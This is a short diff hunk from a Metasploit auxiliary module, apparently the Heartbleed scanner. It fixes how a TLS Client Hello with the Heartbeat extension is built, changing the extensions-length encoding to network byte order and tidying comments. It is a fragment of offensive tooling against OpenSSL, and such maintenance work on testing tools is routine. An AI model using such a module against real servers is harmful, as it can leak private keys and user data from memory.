@@ -248,11 +248,11 @@ class Metasploit3 < Msf::Auxiliary
     hello_data << "\x01"                   # Compression methods length (1)
     hello_data << "\x00"                   # Compression methods: null
 
-    hello_data_extensions = "\x00\x0f"               # Extension type (Heartbeat)
-    hello_data_extensions << "\x00\x01"               # Extension length
-    hello_data_extensions << "\x01"                   # Extension data
+    hello_data_extensions = "\x00\x0f"     # Extension type (Heartbeat)
+    hello_data_extensions << "\x00\x01"    # Extension length
+    hello_data_extensions << "\x01"        # Extension data
 
-    hello_data << [hello_data_extensions.length].pack("v")
+    hello_data << [hello_data_extensions.length].pack("n")
     hello_data << hello_data_extensions
 
     data = "\x01\x00"                      # Handshake Type: Client Hello (1)
